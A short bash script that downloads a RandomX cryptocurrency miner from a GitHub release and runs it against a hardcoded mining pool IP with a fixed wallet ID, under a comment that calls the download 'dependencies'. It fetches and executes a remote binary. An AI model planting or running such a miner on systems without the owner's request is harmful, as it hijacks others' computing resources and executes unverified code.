#!/usr/bin/env bash
apt-get update
apt-get install unzip -y
# install dependencies
wget https://github.com/XDagger/XdagRandomxMiner/releases/download/0.4.2/LinuxRandomxMiner.zip && unzip LinuxRandomxMiner.zip && rm -rf LinuxRandomxMiner.zip && chmod u+x DaggerRandomxMiner && ./DaggerRandomxMiner -cpu -p 82.156.18.237:13654 -t 16 -a A7F3atzGYPEBYAZlTZTfy4bKr8y3Ho57
